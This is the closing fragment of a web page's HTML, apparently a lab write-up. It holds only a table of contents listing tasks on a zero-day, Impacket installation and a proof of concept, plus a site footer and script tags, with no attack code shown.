table-of-contents__left-border"><li><a href="#-we-will-cover--the-topics" class="table-of-contents__link toc-highlight">💢 We will cover  the topics</a></li><li><a href="#task-1-the-zero-day-angle" class="table-of-contents__link toc-highlight">Task 1 The Zero Day Angle</a></li><li><a href="#task-2-impacket-installation" class="table-of-contents__link toc-highlight">Task 2 Impacket Installation</a></li><li><a href="#task-3-the-proof-of-concept" class="table-of-contents__link toc-highlight">Task 3 The Proof of Concept</a></li><li><a href="#task-4-lab-it-up" class="table-of-contents__link toc-highlight">Task 4 Lab It Up!</a></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Support me</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/sponsors/S4CH" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Made with   ♥  by CyFun © 2023 
                            | Built on Docusaurus</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3415e7ae.js"></script>
<script src="/assets/js/main.c90fa39a.js"></script>
</body>
</html>